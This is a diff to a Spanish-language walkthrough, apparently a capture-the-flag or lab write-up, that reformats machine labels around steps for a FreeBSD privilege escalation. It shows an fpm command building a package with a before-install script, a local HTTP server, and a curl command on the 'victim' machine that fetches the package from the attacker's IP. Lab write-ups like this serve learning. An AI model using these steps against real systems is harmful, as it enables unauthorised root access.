@@ -543,17 +543,12 @@ fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
 
 Y se nos creara en nuestro directorio de trabajo un archivo ".txz". Vamos a subir este archivo a la maquina victima y procederemos a instalarlo:
 
-```bash
-[Maquina Local]
-```
+`[Maquina Local]`
 ```bash
 python3 -m http.server
 ```
-
-```bash
-[Maquina Victima]
-[Ojo, hacerlo en el directorio /tmp]
-```
+`[Maquina Victima]`
+`[Ojo, hacerlo en el directorio /tmp]`
 ```bash
 curl -o x-1.0.txz http://[OurIP]/[File]
 ```
